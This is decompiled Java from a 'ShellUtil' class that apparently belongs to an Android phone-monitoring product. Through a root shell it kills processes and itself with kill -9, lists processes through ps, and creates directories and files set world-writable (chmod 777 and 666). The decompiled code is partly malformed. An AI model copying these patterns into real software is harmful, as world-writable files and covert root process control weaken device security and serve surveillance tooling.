package com.vvt.shell;

import android.os.Process;
import android.util.Log;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.util.HashSet;
import java.util.Iterator;
import java.util.regex.Pattern;

public class j
{
  private static boolean a = false;
  private static boolean b = false;
  private static final Pattern c = Pattern.compile("^([bcdlsp-][-r][-w][-xsS][-r][-w][-xsS][-r][-w][-xstST])\\s+(\\S+)\\s+(\\S+)\\s+([\\d\\s,]*)\\s+(\\d{4}-\\d\\d-\\d\\d)\\s+(\\d\\d:\\d\\d)\\s+(.*)$");
  
  public static void a()
  {
    int i = 1;
    int j = Process.myPid();
    Process.killProcess(j);
    try
    {
      Object localObject1 = f.a();
      localObject2 = "kill -9 %d";
      boolean bool1 = true;
      localObject3 = new Object[bool1];
      int k = 0;
      localObject4 = null;
      int m = Process.myPid();
      Object localObject5 = Integer.valueOf(m);
      localObject3[0] = localObject5;
      localObject2 = String.format((String)localObject2, (Object[])localObject3);
      localObject2 = ((f)localObject1).a((String)localObject2);
      bool1 = a;
      if (bool1)
      {
        localObject3 = "ShellUtil";
        localObject4 = "killSelf # out %s";
        m = 1;
        localObject5 = new Object[m];
        localObject5[0] = localObject2;
        localObject2 = String.format((String)localObject4, (Object[])localObject5);
        Log.v((String)localObject3, (String)localObject2);
      }
      ((f)localObject1).d();
      localObject1 = "kill -9 %d";
      bool2 = true;
      localObject2 = new Object[bool2];
      bool1 = false;
      localObject3 = null;
      k = Process.myPid();
      localObject4 = Integer.valueOf(k);
      localObject2[0] = localObject4;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.a((String)localObject1);
      bool2 = a;
      if (bool2)
      {
        localObject2 = "ShellUtil";
        localObject3 = "killSelf # out %s";
        k = 1;
        localObject4 = new Object[k];
        m = 0;
        localObject5 = null;
        localObject4[0] = localObject1;
        localObject1 = String.format((String)localObject3, (Object[])localObject4);
        Log.v((String)localObject2, (String)localObject1);
      }
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        Object localObject4;
        boolean bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killSelf # Error!! %s";
          localObject4 = new Object[i];
          String str = localShellException.toString();
          localObject4[0] = str;
          str = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str);
        }
      }
    }
  }
  
  public static void a(String paramString1, String paramString2, boolean paramBoolean)
  {
    Object localObject1 = e(paramString1);
    Object localObject2;
    int k;
    FileWriter localFileWriter;
    Object localObject3;
    if (localObject1 != null)
    {
      boolean bool1 = ((File)localObject1).canWrite();
      if (bool1) {}
    }
    else
    {
      boolean bool2 = a;
      if (bool2)
      {
        localObject1 = "ShellUtil";
        int j = 1;
        localObject2 = new Object[j];
        k = 0;
        localFileWriter = null;
        localObject2[0] = paramString1;
        localObject3 = String.format("writeToFile # Cannot write to getInstance specific path: %s", (Object[])localObject2);
        Log.e((String)localObject1, (String)localObject3);
      }
    }
    for (;;)
    {
      return;
      try
      {
        localObject3 = new java/io/BufferedReader;
        localObject2 = new java/io/StringReader;
        ((StringReader)localObject2).<init>(paramString2);
        k = 256;
        ((BufferedReader)localObject3).<init>((Reader)localObject2, k);
        localObject2 = new java/io/BufferedWriter;
        localFileWriter = new java/io/FileWriter;
        localFileWriter.<init>((File)localObject1, paramBoolean);
        int i = 256;
        ((BufferedWriter)localObject2).<init>(localFileWriter, i);
        for (;;)
        {
          localObject1 = ((BufferedReader)localObject3).readLine();
          if (localObject1 == null) {
            break;
          }
          ((BufferedWriter)localObject2).append((CharSequence)localObject1);
          localObject1 = "\r\n";
          ((BufferedWriter)localObject2).append((CharSequence)localObject1);
        }
      }
      catch (IOException localIOException) {}
      ((BufferedWriter)localObject2).flush();
      ((BufferedWriter)localObject2).close();
      ((BufferedReader)localObject3).close();
    }
  }
  
  public static void a(String paramString, boolean paramBoolean)
  {
    int i = 1;
    Object localObject1 = "/";
    String[] arrayOfString = paramString.split((String)localObject1);
    int j = 0;
    Object localObject2 = null;
    int k;
    if (paramBoolean)
    {
      localObject1 = f.b();
      k = 0;
    }
    for (;;)
    {
      int m = arrayOfString.length;
      if (k >= m) {
        break label261;
      }
      j = paramString.length();
      if (j > 0)
      {
        j = paramString.charAt(0);
        m = 47;
        if (j != m) {}
      }
      for (localObject2 = "/";; localObject2 = "")
      {
        localObject3 = arrayOfString[k];
        if (localObject3 == null) {
          break label252;
        }
        m = ((String)localObject3).length();
        if (m <= 0) {
          break label252;
        }
        m = 0;
        localObject3 = null;
        while (m <= k)
        {
          localObject4 = arrayOfString[m];
          if (localObject4 != null)
          {
            localObject4 = arrayOfString[m];
            int n = ((String)localObject4).length();
            if (n > 0)
            {
              localObject4 = new java/lang/StringBuilder;
              ((StringBuilder)localObject4).<init>();
              localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
              Object[] arrayOfObject = new Object[i];
              String str = arrayOfString[m];
              arrayOfObject[0] = str;
              localObject4 = String.format("%s/", arrayOfObject);
              localObject2 = (String)localObject4;
            }
          }
          m += 1;
        }
        localObject1 = f.a();
        break;
      }
      Object localObject4 = new Object[i];
      localObject4[0] = localObject2;
      localObject3 = String.format("mkdir %s", (Object[])localObject4);
      ((f)localObject1).a((String)localObject3);
      label252:
      k += 1;
    }
    label261:
    Object localObject3 = new Object[i];
    localObject3[0] = localObject2;
    localObject2 = String.format("chmod 777 %s", (Object[])localObject3);
    ((f)localObject1).a((String)localObject2);
    ((f)localObject1).d();
  }
  
  public static boolean a(String paramString)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2)
    {
      str1 = "ShellUtil";
      localObject1 = "isProcessRunning # ENTER ...";
      Log.v(str1, (String)localObject1);
    }
    String str1 = b();
    localObject1 = new java/io/StringReader;
    ((StringReader)localObject1).<init>(str1);
    localBufferedReader = new java/io/BufferedReader;
    localBufferedReader.<init>((Reader)localObject1);
    for (;;)
    {
      try
      {
        str1 = localBufferedReader.readLine();
        if (str1 != null)
        {
          bool2 = str1.contains(paramString);
          if (!bool2) {
            continue;
          }
          bool2 = a;
          if (bool2)
          {
            str1 = "ShellUtil";
            str2 = "isProcessRunning # Process '%s' is running.";
            int i = 1;
            localObject2 = new Object[i];
            localObject2[0] = paramString;
            str2 = String.format(str2, (Object[])localObject2);
            Log.v(str1, str2);
          }
        }
      }
      catch (IOException localIOException1)
      {
        String str2;
        Object localObject2;
        bool3 = a;
        if (bool3)
        {
          str2 = "ShellUtil";
          localObject2 = localIOException1.getMessage();
          Log.e(str2, (String)localObject2, localIOException1);
        }
        try
        {
          ((StringReader)localObject1).close();
          localBufferedReader.close();
        }
        catch (IOException localIOException2) {}
        continue;
      }
      finally
      {
        try
        {
          ((StringReader)localObject1).close();
          localBufferedReader.close();
        }
        catch (IOException localIOException4)
        {
          continue;
        }
      }
      try
      {
        ((StringReader)localObject1).close();
        localBufferedReader.close();
      }
      catch (IOException localIOException5)
      {
        continue;
      }
      return bool1;
      try
      {
        ((StringReader)localObject1).close();
        localBufferedReader.close();
      }
      catch (IOException localIOException3)
      {
        Object localObject3;
        boolean bool3;
        continue;
      }
      bool2 = a;
      if (bool2)
      {
        str1 = "ShellUtil";
        localObject1 = "isProcessRunning # Process '%s' is not running.";
        localObject3 = new Object[bool1];
        localObject3[0] = paramString;
        localObject3 = String.format((String)localObject1, (Object[])localObject3);
        Log.v(str1, (String)localObject3);
      }
      bool1 = false;
      localObject3 = null;
    }
  }
  
  public static String b()
  {
    f localf = f.a();
    String str = localf.a("/system/bin/ps");
    localf.d();
    return str;
  }
  
  public static boolean b(String paramString)
  {
    boolean bool1 = true;
    Object localObject;
    boolean bool2;
    if (paramString != null)
    {
      localObject = d(paramString);
      int i = ((HashSet)localObject).size();
      if (i > 0)
      {
        Iterator localIterator = ((HashSet)localObject).iterator();
        for (;;)
        {
          bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject = (d)localIterator.next();
          String str1 = ((d)localObject).b;
          c(str1);
          boolean bool3 = a;
          if (bool3)
          {
            str1 = "ShellUtil";
            String str2 = "killProcessByName # Name: %s, pid: %s killed !!";
            int j = 2;
            Object[] arrayOfObject = new Object[j];
            arrayOfObject[0] = paramString;
            localObject = ((d)localObject).b;
            arrayOfObject[bool1] = localObject;
            localObject = String.format(str2, arrayOfObject);
            Log.v(str1, (String)localObject);
          }
        }
        bool2 = bool1;
      }
    }
    for (;;)
    {
      return bool2;
      bool2 = false;
      localObject = null;
    }
  }
  
  public static void c(String paramString)
  {
    int i = 1;
    try
    {
      Object localObject1 = f.b();
      localObject2 = "kill -9 %s";
      boolean bool1 = true;
      localObject3 = new Object[bool1];
      int j = 0;
      localObject4 = null;
      localObject3[0] = paramString;
      localObject2 = String.format((String)localObject2, (Object[])localObject3);
      localObject2 = ((f)localObject1).a((String)localObject2);
      bool1 = a;
      int k;
      Object[] arrayOfObject;
      if (bool1)
      {
        localObject3 = "ShellUtil";
        localObject4 = "killProcessByPid # out %s";
        k = 1;
        arrayOfObject = new Object[k];
        arrayOfObject[0] = localObject2;
        localObject2 = String.format((String)localObject4, arrayOfObject);
        Log.v((String)localObject3, (String)localObject2);
      }
      ((f)localObject1).d();
      localObject1 = "kill -9 %s";
      bool2 = true;
      localObject2 = new Object[bool2];
      bool1 = false;
      localObject3 = null;
      localObject2[0] = paramString;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.a((String)localObject1);
      bool2 = a;
      if (bool2)
      {
        localObject2 = "ShellUtil";
        localObject3 = "killProcessByPid # out %s";
        j = 1;
        localObject4 = new Object[j];
        k = 0;
        arrayOfObject = null;
        localObject4[0] = localObject1;
        localObject1 = String.format((String)localObject3, (Object[])localObject4);
        Log.v((String)localObject2, (String)localObject1);
      }
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killProcessByPid # Error!! %s";
          localObject4 = new Object[i];
          String str1 = localShellException.toString();
          localObject4[0] = str1;
          str1 = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str1);
        }
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        Object localObject4;
        boolean bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killProcessByPid # Error!! %s";
          localObject4 = new Object[i];
          String str2 = localCannotGetRootShellException.toString();
          localObject4[0] = str2;
          str2 = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str2);
        }
      }
    }
  }
  
  public static HashSet d(String paramString)
  {
    int i = 8;
    Object localObject1 = b();
    Object localObject2 = new java/io/BufferedReader;
    Object localObject3 = new java/io/StringReader;
    ((StringReader)localObject3).<init>((String)localObject1);
    int j = 256;
    ((BufferedReader)localObject2).<init>((Reader)localObject3, j);
    localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    try
    {
      Object localObject4;
      for (;;)
      {
        localObject1 = ((BufferedReader)localObject2).readLine();
        if (localObject1 == null) {
          break;
        }
        boolean bool2 = ((String)localObject1).contains(paramString);
        if (bool2)
        {
          localObject4 = "\\s+";
          localObject1 = ((String)localObject1).split((String)localObject4);
          int k = localObject1.length;
          if (k > i)
          {
            localObject4 = new com/vvt/shell/d;
            ((d)localObject4).<init>();
            int m = 0;
            String str = null;
            str = localObject1[0];
            ((d)localObject4).a = str;
            m = 1;
            str = localObject1[m];
            ((d)localObject4).b = str;
            m = 2;
            str = localObject1[m];
            ((d)localObject4).c = str;
            m = 3;
            str = localObject1[m];
            ((d)localObject4).d = str;
            m = 4;
            str = localObject1[m];
            ((d)localObject4).e = str;
            m = 5;
            str = localObject1[m];
            ((d)localObject4).f = str;
            m = 6;
            str = localObject1[m];
            ((d)localObject4).g = str;
            m = 7;
            str = localObject1[m];
            ((d)localObject4).h = str;
            m = 8;
            localObject1 = localObject1[m];
            ((d)localObject4).i = ((String)localObject1);
            localObject1 = ((d)localObject4).i;
            boolean bool1 = ((String)localObject1).equals(paramString);
            if (bool1)
            {
              localObject1 = ((d)localObject4).h;
              str = "S";
              bool1 = ((String)localObject1).equals(str);
              if (!bool1)
              {
                localObject1 = ((d)localObject4).h;
                str = "R";
                bool1 = ((String)localObject1).equals(str);
                if (!bool1) {}
              }
              else
              {
                ((HashSet)localObject3).add(localObject4);
              }
            }
          }
        }
      }
      boolean bool3;
      return (HashSet)localObject3;
    }
    catch (IOException localIOException)
    {
      bool3 = a;
      if (bool3)
      {
        localObject2 = "ShellUtil";
        localObject4 = "findDuplicatedProcess # Error!!";
        Log.e((String)localObject2, (String)localObject4, localIOException);
      }
    }
    for (;;)
    {
      ((BufferedReader)localObject2).close();
    }
  }
  
  private static File e(String paramString)
  {
    Object localObject1 = f(paramString);
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool = ((File)localObject2).exists();
    if (!bool)
    {
      bool = false;
      localObject2 = null;
    }
    try
    {
      a((String)localObject1, false);
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(paramString);
      bool = ((File)localObject1).exists();
      if (!bool) {}
      try
      {
        bool = ((File)localObject1).createNewFile();
        if (bool)
        {
          bool = a;
          if (bool)
          {
            localObject2 = "ShellUtil";
            str = "createFile # File is created: %s";
            i = 1;
            arrayOfObject = new Object[i];
            arrayOfObject[0] = paramString;
            str = String.format(str, arrayOfObject);
            Log.v((String)localObject2, str);
          }
          localObject2 = f.a();
          String str = "chmod 666 %s";
          int i = 1;
          Object[] arrayOfObject = new Object[i];
          arrayOfObject[0] = paramString;
          str = String.format(str, arrayOfObject);
          ((f)localObject2).a(str);
          ((f)localObject2).d();
        }
      }
      catch (IOException localIOException)
      {
        for (;;) {}
      }
      return (File)localObject1;
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;) {}
    }
  }
  
  private static String f(String paramString)
  {
    String[] arrayOfString = paramString.split("/");
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    int i = 0;
    for (;;)
    {
      int j = arrayOfString.length + -1;
      if (i >= j) {
        break;
      }
      Object localObject = arrayOfString[i];
      localObject = localStringBuilder.append((String)localObject);
      String str = "/";
      ((StringBuilder)localObject).append(str);
      i += 1;
    }
    i = localStringBuilder.length() + -1;
    int k = localStringBuilder.length();
    localStringBuilder.replace(i, k, "");
    return localStringBuilder.toString();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/shell/j.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */